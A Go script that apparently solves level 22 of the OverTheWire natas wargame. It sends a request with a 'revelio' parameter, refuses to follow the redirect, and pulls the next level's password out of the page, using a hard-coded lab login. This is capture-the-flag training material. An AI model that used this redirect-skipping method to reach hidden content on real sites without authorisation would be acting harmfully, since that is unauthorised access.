package main

import "fmt"
import "io/ioutil"
import "net/http"
import "net/url"
import "strings"

func getFlag() string {

	var result string = ""

	params := url.Values{}
	params.Set("revelio", "1")
	base_url := "http://natas22.natas.labs.overthewire.org/"
	real_url := base_url + "?" + params.Encode()

	client := &http.Client{
		CheckRedirect: func(request *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	request, _ := http.NewRequest("GET", real_url, nil)
	request.Header.Add("Content-Type", "text/html")
	request.SetBasicAuth("natas22", "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s")

	response, err1 := client.Do(request)

	if err1 == nil {

		body, err2 := ioutil.ReadAll(response.Body)

		if err2 == nil {

			html := string(body)

			if strings.Contains(html, "Password:") && strings.Contains(html, "</pre") {

				tmp := html[strings.Index(html, "Password:")+9:]
				result = strings.TrimSpace(tmp[0:strings.Index(tmp, "</pre")])

			}

		}

	}

	return result

}

func main() {

	flag := getFlag()

	fmt.Println(flag)

}

